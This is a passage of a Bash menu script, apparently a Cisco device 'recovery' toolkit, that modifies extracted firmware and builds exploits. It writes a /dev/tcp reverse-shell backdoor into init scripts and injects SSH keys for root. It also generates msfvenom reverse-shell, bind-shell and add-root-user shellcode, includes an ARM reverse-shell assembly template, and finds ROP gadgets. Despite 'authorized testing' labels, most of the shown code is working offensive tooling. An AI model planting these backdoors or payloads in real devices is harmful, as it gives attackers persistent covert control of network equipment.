# Reverse shell backdoor - authorized testing only
/bin/sh -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 &
BACKDOOR_EOF
                        chmod +x "$backdoor_script"
                        echo "SUCCESS: Reverse shell backdoor created"
                        echo "         Connects to $attacker_ip:$attacker_port"
                        ;;
                    3)
                        read -r -p "Enter path to your SSH public key: " pubkey_file
                        if [ -f "$pubkey_file" ]; then
                            mkdir -p "$fs_root/root/.ssh"
                            cat "$pubkey_file" >> "$fs_root/root/.ssh/authorized_keys"
                            chmod 600 "$fs_root/root/.ssh/authorized_keys"
                            echo "SUCCESS: SSH key injected for root user"
                        else
                            echo "ERROR: Public key file not found"
                        fi
                        ;;
                    4)
                        read -r -p "Enter path to custom backdoor script: " custom_script
                        if [ -f "$custom_script" ]; then
                            mkdir -p "$fs_root/etc/init.d"
                            cp "$custom_script" "$backdoor_script"
                            chmod +x "$backdoor_script"
                            echo "SUCCESS: Custom backdoor installed"
                        else
                            echo "ERROR: Script file not found"
                        fi
                        ;;
                esac

                log_message "WARNING" "Backdoor injected (authorized testing): $backdoor_script"
                read -r -p "Press Enter to continue..."
                ;;
            9)
                echo
                echo "--- Modify Init Scripts ---"
                echo "Common init script locations:"
                echo

                if [ -d "$fs_root/etc/init.d" ]; then
                    echo "  /etc/init.d:"
                    ls "$fs_root/etc/init.d" 2>/dev/null | head -10
                fi

                if [ -d "$fs_root/etc/rc.d" ]; then
                    echo "  /etc/rc.d:"
                    ls "$fs_root/etc/rc.d" 2>/dev/null | head -10
                fi

                echo
                read -r -p "Enter init script to edit (e.g., etc/init.d/rcS): " init_script

                local full_path="$fs_root/$init_script"

                if [ -f "$full_path" ]; then
                    cp "$full_path" "${full_path}.backup"
                    echo "Backup created: ${full_path}.backup"

                    if command -v nano &> /dev/null; then
                        nano "$full_path"
                    elif command -v vi &> /dev/null; then
                        vi "$full_path"
                    else
                        echo "No text editor available"
                    fi

                    log_message "INFO" "Modified init script: $full_path"
                else
                    echo "ERROR: Init script not found: $full_path"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            b)
                echo "Filesystem modifications complete"
                return 0
                ;;
            *)
                echo "Invalid option."
                sleep 1
                ;;
        esac
    done
}

firmware_fs_repackage() {
    print_header
    echo "=== Firmware Filesystem Repackager ==="
    echo
    echo "Repackage modified filesystem into firmware image:"
    echo "  - SquashFS support (mksquashfs)"
    echo "  - JFFS2 support (mkfs.jffs2)"
    echo "  - CPIO archive support"
    echo "  - Custom compression options"
    echo

    read -r -p "Enter path to filesystem root directory: " fs_root

    if [ ! -d "$fs_root" ]; then
        echo "ERROR: Directory not found: $fs_root"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    log_message "INFO" "Starting filesystem repackaging: $fs_root"

    echo
    echo "Select filesystem type:"
    echo "  1) SquashFS (most common)"
    echo "  2) JFFS2"
    echo "  3) CPIO archive"
    echo "  4) TAR archive"
    echo
    read -r -p "Choose filesystem type: " fs_type

    local output_file="${SESSION_DIR}/repacked_$(basename "$fs_root")_$(date +%s)"

    case "$fs_type" in
        1)
            echo
            echo "--- SquashFS Repackaging ---"

            if ! command -v mksquashfs &> /dev/null; then
                echo "ERROR: mksquashfs not found"
                echo "Install with: sudo apt-get install squashfs-tools"
                read -r -p "Press Enter to continue..."
                return 1
            fi

            output_file="${output_file}.squashfs"

            echo "Compression options:"
            echo "  1) gzip (default)"
            echo "  2) lzma (better compression)"
            echo "  3) xz (best compression)"
            echo "  4) lzo (fastest)"
            echo
            read -r -p "Choose compression: " comp_choice

            local comp_type="gzip"
            case "$comp_choice" in
                2) comp_type="lzma" ;;
                3) comp_type="xz" ;;
                4) comp_type="lzo" ;;
            esac

            echo
            echo "Creating SquashFS image with $comp_type compression..."
            mksquashfs "$fs_root" "$output_file" -comp "$comp_type" -noappend 2>&1 | tee "${output_file}.log"

            if [ -f "$output_file" ]; then
                echo
                echo "SUCCESS: SquashFS image created"
                echo "Output: $output_file"
                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
                log_message "INFO" "Created SquashFS: $output_file"
            else
                echo "ERROR: Failed to create SquashFS image"
            fi
            ;;
        2)
            echo
            echo "--- JFFS2 Repackaging ---"

            if ! command -v mkfs.jffs2 &> /dev/null; then
                echo "ERROR: mkfs.jffs2 not found"
                echo "Install with: sudo apt-get install mtd-utils"
                read -r -p "Press Enter to continue..."
                return 1
            fi

            output_file="${output_file}.jffs2"

            read -r -p "Enter erase block size in KB (default 64): " erase_size
            erase_size=${erase_size:-64}

            read -r -p "Enter page size (default 2048): " page_size
            page_size=${page_size:-2048}

            echo
            echo "Creating JFFS2 image..."
            mkfs.jffs2 -r "$fs_root" -o "$output_file" -e "${erase_size}KiB" -s "$page_size" -n 2>&1 | tee "${output_file}.log"

            if [ -f "$output_file" ]; then
                echo
                echo "SUCCESS: JFFS2 image created"
                echo "Output: $output_file"
                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
                log_message "INFO" "Created JFFS2: $output_file"
            else
                echo "ERROR: Failed to create JFFS2 image"
            fi
            ;;
        3)
            echo
            echo "--- CPIO Archive ---"
            output_file="${output_file}.cpio.gz"

            echo "Creating CPIO archive..."
            cd "$fs_root"
            find . | cpio -o -H newc 2>/dev/null | gzip > "$output_file"

            if [ -f "$output_file" ]; then
                echo
                echo "SUCCESS: CPIO archive created"
                echo "Output: $output_file"
                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
                log_message "INFO" "Created CPIO: $output_file"
            else
                echo "ERROR: Failed to create CPIO archive"
            fi
            ;;
        4)
            echo
            echo "--- TAR Archive ---"
            output_file="${output_file}.tar.gz"

            echo "Creating TAR archive..."
            tar -czf "$output_file" -C "$fs_root" . 2>&1

            if [ -f "$output_file" ]; then
                echo
                echo "SUCCESS: TAR archive created"
                echo "Output: $output_file"
                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
                log_message "INFO" "Created TAR: $output_file"
            else
                echo "ERROR: Failed to create TAR archive"
            fi
            ;;
        *)
            echo "Invalid option"
            read -r -p "Press Enter to continue..."
            return 1
            ;;
    esac

    echo
    echo "Repackaging complete!"
    echo "Modified filesystem image: $output_file"
    echo
    echo "Next steps:"
    echo "  - Flash this image via JTAG (Firmware Manipulation menu)"
    echo "  - Or integrate into full firmware update package"
    echo

    read -r -p "Press Enter to continue..."
}

menu_firmware_filesystem_tools() {
    while true; do
        print_header
        echo "--- Firmware Filesystem Tools ---"
        echo
        echo "  1) Extract Filesystem from Firmware"
        echo "     (Auto-detect and extract squashfs, jffs2, cramfs, etc.)"
        echo
        echo "  2) Modify Extracted Filesystem"
        echo "     (Edit configs, replace binaries, inject backdoors)"
        echo
        echo "  3) Repackage Filesystem"
        echo "     (Rebuild filesystem image for flashing)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) firmware_fs_extract ;;
            2) firmware_fs_modify ;;
            3) firmware_fs_repackage ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Firmware Filesystem Tools ---

# --- Automated Exploit Development Tools ---

exploit_rop_gadget_finder() {
    print_header
    echo "=== ROP Gadget Finder ==="
    echo
    echo "Find Return-Oriented Programming (ROP) gadgets in binaries:"
    echo "  - Automatic gadget discovery"
    echo "  - Gadget filtering by instruction type"
    echo "  - Address and offset information"
    echo

    read -r -p "Enter path to binary/firmware file: " binary_file

    if [ ! -f "$binary_file" ]; then
        echo "ERROR: File not found: $binary_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local output_dir="${SESSION_DIR}/rop_gadgets_$(basename "$binary_file")_$(date +%s)"
    mkdir -p "$output_dir"

    log_message "INFO" "Starting ROP gadget search: $binary_file"

    echo
    echo ">>> Searching for ROP Gadgets"
    echo "------------------------------"

    if command -v ROPgadget &> /dev/null || command -v ropgadget &> /dev/null; then
        local rop_cmd="ROPgadget"
        command -v ROPgadget &> /dev/null || rop_cmd="ropgadget"

        echo "Using $rop_cmd to find gadgets..."
        $rop_cmd --binary "$binary_file" > "$output_dir/all_gadgets.txt" 2>&1

        local gadget_count=$(grep -c '^0x' "$output_dir/all_gadgets.txt" 2>/dev/null || echo 0)
        echo "Found $gadget_count gadgets"
        echo "Full list: $output_dir/all_gadgets.txt"

        # Extract useful gadget categories
        echo
        echo "Categorizing gadgets..."
        grep 'pop.*; ret' "$output_dir/all_gadgets.txt" > "$output_dir/pop_ret.txt" 2>/dev/null || true
        grep 'mov.*; ret' "$output_dir/all_gadgets.txt" > "$output_dir/mov_ret.txt" 2>/dev/null || true
        grep 'call' "$output_dir/all_gadgets.txt" > "$output_dir/call.txt" 2>/dev/null || true
        grep 'jmp' "$output_dir/all_gadgets.txt" > "$output_dir/jmp.txt" 2>/dev/null || true

        echo "  pop/ret gadgets: $(wc -l < "$output_dir/pop_ret.txt") → $output_dir/pop_ret.txt"
        echo "  mov/ret gadgets: $(wc -l < "$output_dir/mov_ret.txt") → $output_dir/mov_ret.txt"
        echo "  call gadgets: $(wc -l < "$output_dir/call.txt") → $output_dir/call.txt"
        echo "  jmp gadgets: $(wc -l < "$output_dir/jmp.txt") → $output_dir/jmp.txt"

        echo
        echo "Useful pop/ret gadgets (first 20):"
        head -20 "$output_dir/pop_ret.txt" 2>/dev/null | sed 's/^/  /'

    else
        echo "ERROR: ROPgadget not installed"
        echo "Install with: pip install ROPgadget"
        echo
        echo "Attempting manual gadget search..."

        if command -v objdump &> /dev/null; then
            echo "Using objdump for basic gadget discovery..."
            objdump -d "$binary_file" | grep -E '(ret|pop|mov|call|jmp)' > "$output_dir/disasm_gadgets.txt" 2>&1
            echo "Disassembly saved to: $output_dir/disasm_gadgets.txt"
        else
            echo "ERROR: Neither ROPgadget nor objdump available"
        fi
    fi

    echo
    echo "========================================="
    echo "ROP Gadget Search Complete!"
    echo "========================================="
    echo "Output directory: $output_dir"

    log_message "INFO" "ROP gadget search completed: $output_dir"
    read -r -p "Press Enter to continue..."
}

exploit_shellcode_generator() {
    print_header
    echo "=== Shellcode Generator ==="
    echo
    echo "Generate shellcode for various architectures and payloads"
    echo

    echo "Select target architecture:"
    echo "  1) ARM (armle)"
    echo "  2) MIPS (mipsle)"
    echo "  3) x86"
    echo "  4) x86_64"
    echo
    read -r -p "Choose architecture: " arch_choice

    local arch=""
    case "$arch_choice" in
        1) arch="armle" ;;
        2) arch="mipsle" ;;
        3) arch="x86" ;;
        4) arch="x86_64" ;;
        *) echo "Invalid choice" && return 1 ;;
    esac

    echo
    echo "Select payload type:"
    echo "  1) Reverse shell (connect-back)"
    echo "  2) Bind shell (listen)"
    echo "  3) Exec command"
    echo "  4) Add user (root)"
    echo
    read -r -p "Choose payload: " payload_choice

    local output_file="${SESSION_DIR}/shellcode_${arch}_$(date +%s).bin"

    case "$payload_choice" in
        1)
            read -r -p "Enter LHOST (attacker IP): " lhost
            read -r -p "Enter LPORT (attacker port): " lport

            echo
            echo "Generating reverse shell shellcode for $arch..."

            if command -v msfvenom &> /dev/null; then
                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > "$output_file" 2>&1
                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f c >> "${output_file}.c" 2>&1
                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f python >> "${output_file}.py" 2>&1

                echo "SUCCESS: Shellcode generated"
                echo "  Binary: $output_file"
                echo "  C format: ${output_file}.c"
                echo "  Python format: ${output_file}.py"
                echo
                echo "C code preview:"
                head -20 "${output_file}.c"
            else
                echo "ERROR: msfvenom not installed"
                echo "Install Metasploit Framework for shellcode generation"
                echo
                echo "Manual ARM reverse shell shellcode template:"
                cat > "${output_file}_manual.s" <<'EOF'
.section .text
.global _start
_start:
    // socket(AF_INET, SOCK_STREAM, 0)
    mov r0, #2
    mov r1, #1
    eor r2, r2, r2
    mov r7, #281
    svc #0
    mov r4, r0

    // connect(sock, &addr, 16)
    adr r1, addr
    mov r2, #16
    mov r7, #283
    svc #0

    // dup2(sock, 0/1/2)
    mov r0, r4
    mov r1, #0
    mov r7, #63
    svc #0
    mov r1, #1
    svc #0
    mov r1, #2
    svc #0

    // execve("/bin/sh", NULL, NULL)
    adr r0, shell
    eor r1, r1, r1
    eor r2, r2, r2
    mov r7, #11
    svc #0

addr:
    .short 2
    .short 0x1234  // port (change to target port in network byte order)
    .byte 192, 168, 1, 1  // IP address
shell:
    .asciz "/bin/sh"
EOF
                echo "Template saved to: ${output_file}_manual.s"
                echo "Customize the IP and port, then assemble with: arm-linux-gnueabi-as"
            fi
            ;;
        2)
            read -r -p "Enter bind port: " bind_port

            echo
            echo "Generating bind shell shellcode for $arch..."

            if command -v msfvenom &> /dev/null; then
                msfvenom -p linux/$arch/shell_bind_tcp LPORT="$bind_port" -f raw > "$output_file" 2>&1
                msfvenom -p linux/$arch/shell_bind_tcp LPORT="$bind_port" -f c >> "${output_file}.c" 2>&1

                echo "SUCCESS: Bind shell shellcode generated"
                echo "  Binary: $output_file"
                echo "  C format: ${output_file}.c"
            else
                echo "ERROR: msfvenom not installed"
            fi
            ;;
        3)
            read -r -p "Enter command to execute: " exec_cmd

            echo
            echo "Generating exec shellcode for $arch..."

            if command -v msfvenom &> /dev/null; then
                msfvenom -p linux/$arch/exec CMD="$exec_cmd" -f raw > "$output_file" 2>&1
                msfvenom -p linux/$arch/exec CMD="$exec_cmd" -f c >> "${output_file}.c" 2>&1

                echo "SUCCESS: Exec shellcode generated"
                echo "  Binary: $output_file"
                echo "  C format: ${output_file}.c"
            else
                echo "ERROR: msfvenom not installed"
            fi
            ;;
        4)
            read -r -p "Enter username to add: " new_user
            read -r -p "Enter password: " new_pass

            echo
            echo "Generating adduser shellcode for $arch..."

            if command -v msfvenom &> /dev/null; then
                msfvenom -p linux/$arch/adduser USER="$new_user" PASS="$new_pass" -f raw > "$output_file" 2>&1
                msfvenom -p linux/$arch/adduser USER="$new_user" PASS="$new_pass" -f c >> "${output_file}.c" 2>&1

                echo "SUCCESS: Add user shellcode generated"
                echo "  Binary: $output_file"
                echo "  C format: ${output_file}.c"
            else
                echo "ERROR: msfvenom not installed"
            fi
            ;;
    esac

    echo
    log_message "INFO" "Shellcode generated for $arch: $output_file"
    read -r -p "Press Enter to continue..."
}

exploit_buffer_overflow_detector() {
    print_header
    echo "=== Buffer Overflow Vulnerability Detector ==="
    echo
    echo "Analyze binaries for buffer overflow vulnerabilities:"
    echo "  - Dangerous function usage"
    echo "  - Stack protection analysis"
    echo "  - ASLR/PIE/NX detection"
    echo "  - Format string vulnerabilities"
    echo

    read -r -p "Enter path to binary: " binary_file

    if [ ! -f "$binary_file" ]; then
        echo "ERROR: File not found: $binary_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local report_file="${SESSION_DIR}/vuln_report_$(basename "$binary_file")_$(date +%s).txt"

    log_message "INFO" "Starting vulnerability analysis: $binary_file"

    echo
    echo ">>> Analysis 1/5: Binary Security Features"
    echo "-------------------------------------------"

    if command -v checksec &> /dev/null; then
        checksec --file="$binary_file" | tee -a "$report_file"
    else
        echo "checksec not available, using manual checks..."

        if command -v readelf &> /dev/null; then
            echo "Stack Canary:"
            readelf -s "$binary_file" | grep -q '__stack_chk_fail' && echo "  YES - Stack canary enabled" || echo "  NO - No stack protection"

            echo "NX (Non-Executable Stack):"
            readelf -l "$binary_file" | grep -q 'GNU_STACK.*RWE' && echo "  NO - Stack is executable!" || echo "  YES - Stack is non-executable"

            echo "PIE (Position Independent Executable):"
            readelf -h "$binary_file" | grep -q 'DYN' && echo "  YES - PIE enabled" || echo "  NO - Not PIE"

            echo "RELRO:"
            readelf -l "$binary_file" | grep -q 'GNU_RELRO' && echo "  Partial RELRO" || echo "  NO RELRO"
        else
            echo "readelf not available"
        fi
    fi

    echo
    echo ">>> Analysis 2/5: Dangerous Functions"
    echo "--------------------------------------"

    if command -v objdump &> /dev/null; then
        echo "Checking for dangerous function calls..."

        local dangerous_funcs=$(objdump -T "$binary_file" 2>/dev/null | grep -Eo '\b(strcpy|strcat|gets|scanf|sprintf|vsprintf|strncpy|strncat)\b' | sort -u)

        if [ -n "$dangerous_funcs" ]; then
            echo "WARNING: Found dangerous functions:"
            echo "$dangerous_funcs" | sed 's/^/  - /'
        else
            echo "OK: No obvious dangerous functions found"
        fi
    fi

    echo
    echo ">>> Analysis 3/5: Format String Vulnerabilities"
    echo "------------------------------------------------"

    if command -v strings &> /dev/null; then
        echo "Searching for format string patterns..."

        local format_strings=$(strings "$binary_file" | grep -E '%[0-9]*[sdxpn]' | head -10)

        if [ -n "$format_strings" ]; then
            echo "Found format string patterns (sample):"
            echo "$format_strings" | sed 's/^/  /'
            echo "  (Manual review required to confirm vulnerabilities)"
        else
            echo "No format string patterns detected"
        fi
    fi

    echo
    echo ">>> Analysis 4/5: Buffer Overflow Candidates"
    echo "---------------------------------------------"

    if command -v strings &> /dev/null && command -v objdump &> /dev/null; then
        echo "Analyzing for potential overflow points..."

        # Check for strcpy, gets, scanf usage
        local has_strcpy=$(objdump -d "$binary_file" 2>/dev/null | grep -c 'strcpy' || echo 0)
        local has_gets=$(objdump -d "$binary_file" 2>/dev/null | grep -c '<gets@plt>' || echo 0)
        local has_scanf=$(objdump -d "$binary_file" 2>/dev/null | grep -c 'scanf' || echo 0)

        echo "  strcpy calls: $has_strcpy"
        echo "  gets calls: $has_gets (CRITICAL if > 0)"
        echo "  scanf calls: $has_scanf"

        if [ "$has_gets" -gt 0 ]; then
            echo
            echo "  CRITICAL: gets() is inherently unsafe and leads to buffer overflows!"
        fi
    fi

    echo
    echo ">>> Analysis 5/5: ASLR Status (System-Wide)"
    echo "--------------------------------------------"

    if [ -f /proc/sys/kernel/randomize_va_space ]; then
        local aslr_val=$(cat /proc/sys/kernel/randomize_va_space)
        echo "ASLR setting: $aslr_val"
        case "$aslr_val" in
            0) echo "  DISABLED - No randomization" ;;
            1) echo "  PARTIAL - Conservative randomization" ;;
            2) echo "  FULL - Full randomization (default)" ;;
        esac
    else
        echo "Cannot determine ASLR status"
    fi

    echo
    echo "========================================="
    echo "Vulnerability Analysis Complete!"
    echo "========================================="
    echo "Report saved to: $report_file"
    echo
    echo "RECOMMENDATIONS:"
    echo "  1. Test binary with fuzzing tools (AFL, libFuzzer)"
    echo "  2. Use GDB with pattern_create/pattern_offset for exploit development"
    echo "  3. Check for heap-based vulnerabilities separately"
    echo "  4. Review source code if available"
    echo

    log_message "INFO" "Vulnerability analysis completed: $report_file"
    read -r -p "Press Enter to continue..."
}

menu_exploit_dev_tools() {
    while true; do
        print_header
        echo "--- Automated Exploit Development Tools ---"
        echo
        echo "  1) ROP Gadget Finder"
        echo "     (Find Return-Oriented Programming gadgets)"
        echo
        echo "  2) Shellcode Generator"
        echo "     (Generate payloads for ARM, MIPS, x86)"
        echo
        echo "  3) Buffer Overflow Detector"
        echo "     (Analyze binaries for vulnerabilities)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) exploit_rop_gadget_finder ;;
            2) exploit_shellcode_generator ;;
            3) exploit_buffer_overflow_detector ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Automated Exploit Development Tools ---

# --- Configuration Management System ---

config_save_profile() {
    local profile_dir="$HOME/.config/cisco_recovery/profiles"
    mkdir -p "$profile_dir"

    print_header
    echo "=== Save Current Configuration Profile ==="
    echo
    echo "Current settings:"
    echo "  Platform: $PLATFORM"
    echo "  JTAG Adapter: $JTAG_ADAPTER"
    echo "  Architecture: $TARGET_ARCH"
    echo

    read -r -p "Enter profile name: " profile_name

    if [ -z "$profile_name" ]; then
        echo "ERROR: Profile name cannot be empty"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local profile_file="$profile_dir/${profile_name}.conf"

    cat > "$profile_file" <<EOF
# Cisco Recovery Tool Configuration Profile
# Profile: $profile_name
# Created: $(date)

PLATFORM="$PLATFORM"
JTAG_ADAPTER="$JTAG_ADAPTER"
TARGET_ARCH="$TARGET_ARCH"
OPENOCD_SCRIPT_PATH="$OPENOCD_SCRIPT_PATH"
EOF

    echo "SUCCESS: Profile saved to $profile_file"
    log_message "INFO" "Saved configuration profile: $profile_name"
    read -r -p "Press Enter to continue..."
}

config_load_profile() {
    local profile_dir="$HOME/.config/cisco_recovery/profiles"

    print_header
    echo "=== Load Configuration Profile ==="
    echo

    if [ ! -d "$profile_dir" ] || [ -z "$(ls -A "$profile_dir" 2>/dev/null)" ]; then
        echo "No profiles found in $profile_dir"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    echo "Available profiles:"
    local i=1
    local profiles=()
    for profile in "$profile_dir"/*.conf; do
        if [ -f "$profile" ]; then
            profiles+=("$profile")
            echo "  $i) $(basename "$profile" .conf)"
            i=$((i + 1))
        fi
    done

    echo
    read -r -p "Select profile number: " profile_num

    if [ "$profile_num" -ge 1 ] && [ "$profile_num" -lt "$i" ]; then
        local selected_profile="${profiles[$((profile_num - 1))]}"

        echo "Loading profile: $(basename "$selected_profile" .conf)"
        source "$selected_profile"

        echo "SUCCESS: Profile loaded"
        echo "  Platform: $PLATFORM"
        echo "  JTAG Adapter: $JTAG_ADAPTER"
        echo "  Architecture: $TARGET_ARCH"

        log_message "INFO" "Loaded configuration profile: $(basename "$selected_profile" .conf)"
    else
        echo "ERROR: Invalid selection"
    fi

    read -r -p "Press Enter to continue..."
}

config_quick_launch() {
    print_header
    echo "=== Quick Launch System ==="
    echo
    echo "Launch common workflows with saved configurations"
    echo
    echo "  1) Quick Password Recovery (ISR)"
    echo "  2) Quick JTAG Boot Intercept"
    echo "  3) Quick Firmware Extract & Modify"
    echo "  4) Quick Vulnerability Scan"
    echo "  5) Quick ROP Chain Development"
    echo "  b) Back"
    echo
    read -r -p "Choose workflow: " workflow_choice

    case "$workflow_choice" in
        1)
            echo
            echo "=== Quick Password Recovery ==="
            PLATFORM="isr"
            TARGET_ARCH="arm"
            echo "Auto-configured for ISR platform"
            echo "Launching password recovery menu..."
            sleep 2
            menu_password_recovery
            ;;
        2)
            echo
            echo "=== Quick JTAG Boot Intercept ==="
            echo "Launching automated boot interception..."
            sleep 1
            jtag_auto_boot_interrupt
            ;;
        3)
            echo
            echo "=== Quick Firmware Extract & Modify ==="
            read -r -p "Enter firmware file path: " fw_file
            if [ -f "$fw_file" ]; then
                firmware_fs_extract
                firmware_fs_modify
            else
                echo "ERROR: Firmware file not found"
            fi
            ;;
        4)
            echo
            echo "=== Quick Vulnerability Scan ==="
            read -r -p "Enter firmware/binary path: " scan_file
            if [ -f "$scan_file" ]; then
                firmware_vulnerability_scan
            else
                echo "ERROR: File not found"
            fi
            ;;
        5)
            echo
            echo "=== Quick ROP Chain Development ==="
            read -r -p "Enter binary path: " rop_file
            if [ -f "$rop_file" ]; then
                exploit_rop_gadget_finder
            else
                echo "ERROR: Binary not found"
            fi
            ;;
        b)
            return 0
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac

    read -r -p "Press Enter to continue..."
}

menu_config_management() {
    while true; do
        print_header
        echo "--- Configuration Management System ---"
        echo
        echo "  1) Save Current Profile"
        echo "     (Save platform, JTAG adapter, architecture settings)"
        echo
        echo "  2) Load Profile"
        echo "     (Restore saved configuration)"
        echo
        echo "  3) Quick Launch Workflows"
        echo "     (Pre-configured common tasks)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) config_save_profile ;;
            2) config_load_profile ;;
            3) config_quick_launch ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Configuration Management System ---

# --- Live Memory Manipulation During Boot ---

live_memory_poke_peek() {
    print_header
    echo "=== Live Memory Poke/Peek (JTAG) ==="
    echo
    echo "Read and write memory while device is halted"
    echo "WARNING: Incorrect memory writes can brick the device!"
    echo

    if [ "$JTAG_ADAPTER" = "auto" ]; then
        echo "ERROR: JTAG adapter not configured"
        echo "Please configure JTAG adapter first (Menu 1)"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    echo "  1) Peek (Read memory)"
    echo "  2) Poke (Write memory)"
    echo "  3) Dump memory range"
    echo "  4) Fill memory with pattern"
    echo "  b) Back"
    echo
    read -r -p "Choose operation: " op_choice

    case "$op_choice" in
        1)
            echo
            echo "--- Memory Peek (Read) ---"
            read -r -p "Enter memory address (hex, e.g., 0x80000000): " mem_addr
            read -r -p "Enter number of bytes to read (default 16): " read_bytes
            read_bytes=${read_bytes:-16}

            local dump_file="${SESSION_DIR}/mem_peek_${mem_addr}_$(date +%s).bin"

            echo "Reading $read_bytes bytes from $mem_addr..."
            {
                sleep 1
                echo "halt"
                sleep 1
                echo "dump_image \"$dump_file\" $mem_addr $read_bytes"
                sleep 2
                echo "resume"
                sleep 1
                echo "exit"
            } | telnet localhost 4444 2>&1

            if [ -f "$dump_file" ]; then
                echo "SUCCESS: Memory dumped to $dump_file"
                echo
                echo "Hex dump:"
                xxd "$dump_file" | head -20
            else
                echo "ERROR: Memory read failed"
            fi
            ;;
        2)
            echo
            echo "--- Memory Poke (Write) ---"
            echo "WARNING: This can brick the device if used incorrectly!"
            read -r -p "Enter memory address (hex): " mem_addr
            read -r -p "Enter value to write (hex, e.g., 0xDEADBEEF): " mem_value
            read -r -p "Enter word size (8/16/32/64 bits): " word_size

            echo
            read -r -p "Are you SURE you want to write $mem_value to $mem_addr? (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                echo "Writing $mem_value to $mem_addr..."
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "mww $mem_addr $mem_value"
                    sleep 1
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "WARNING" "Memory write: $mem_value -> $mem_addr"
            else
                echo "Cancelled"
            fi
            ;;
        3)
            echo
            echo "--- Dump Memory Range ---"
            read -r -p "Enter start address (hex): " start_addr
            read -r -p "Enter end address (hex): " end_addr

            # Calculate size
            local start_dec=$((start_addr))
            local end_dec=$((end_addr))
            local size=$((end_dec - start_dec))

            local dump_file="${SESSION_DIR}/mem_range_${start_addr}_${end_addr}_$(date +%s).bin"

            echo "Dumping $size bytes from $start_addr to $end_addr..."
            {
                sleep 1
                echo "halt"
                sleep 1
                echo "dump_image \"$dump_file\" $start_addr $size"
                sleep 3
                echo "resume"
                sleep 1
                echo "exit"
            } | telnet localhost 4444 2>&1

            echo "Memory range dumped to: $dump_file"
            ;;
        4)
            echo
            echo "--- Fill Memory with Pattern ---"
            read -r -p "Enter start address (hex): " start_addr
            read -r -p "Enter size in bytes: " fill_size
            read -r -p "Enter fill pattern (hex, e.g., 0x90 for NOP): " fill_pattern

            echo
            read -r -p "Fill $fill_size bytes at $start_addr with $fill_pattern? (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                echo "Filling memory..."
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    for ((i=0; i<fill_size; i+=4)); do
                        echo "mww $((start_addr + i)) $fill_pattern"
                    done
                    sleep 2
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "WARNING" "Memory fill: $fill_pattern at $start_addr ($fill_size bytes)"
            else
                echo "Cancelled"
            fi
            ;;
    esac

    read -r -p "Press Enter to continue..."
}

live_register_manipulation() {
    print_header
    echo "=== Live Register Manipulation ==="
    echo
    echo "Read and modify CPU registers while device is halted"
    echo

    echo "  1) Read all registers"
    echo "  2) Read specific register"
    echo "  3) Modify register"
    echo "  4) Set PC (Program Counter)"
    echo "  5) Modify Stack Pointer"
    echo "  b) Back"
    echo
    read -r -p "Choose operation: " reg_choice

    case "$reg_choice" in
        1)
            echo
            echo "--- Reading All Registers ---"
            {
                sleep 1
                echo "halt"
                sleep 1
                echo "reg"
                sleep 2
                echo "resume"
                sleep 1
                echo "exit"
            } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/registers_$(date +%s).txt"
            ;;
        2)
            echo
            echo "--- Read Specific Register ---"
            read -r -p "Enter register name (e.g., r0, pc, sp): " reg_name
            {
                sleep 1
                echo "halt"
                sleep 1
                echo "reg $reg_name"
                sleep 1
                echo "resume"
                sleep 1
                echo "exit"
            } | telnet localhost 4444 2>&1
            ;;
        3)
            echo
            echo "--- Modify Register ---"
            read -r -p "Enter register name: " reg_name
            read -r -p "Enter new value (hex): " reg_value

            echo
            read -r -p "Set $reg_name = $reg_value? (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "reg $reg_name $reg_value"
                    sleep 1
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "WARNING" "Register modified: $reg_name = $reg_value"
            fi
            ;;
        4)
            echo
            echo "--- Set Program Counter ---"
            echo "WARNING: This will redirect execution flow!"
            read -r -p "Enter new PC value (hex): " pc_value

            echo
            read -r -p "Set PC = $pc_value? This will jump execution! (yes/no): " confirm

            if [ "$confirm" = "yes" ]; then
                {
                    sleep 1
                    echo "halt"
                    sleep 1
                    echo "reg pc $pc_value"
                    sleep 1
                    echo "resume"
                    sleep 1
                    echo "exit"
                } | telnet localhost 4444 2>&1

                log_message "CRITICAL" "PC modified: PC = $pc_value"
            fi
            ;;
        5)
            echo
            echo "--- Modify Stack Pointer ---"
            read -r -p "Enter new SP value (hex): " sp_value

            echo
            read -r -p "Set SP = $sp_value? (yes/no): " confirm

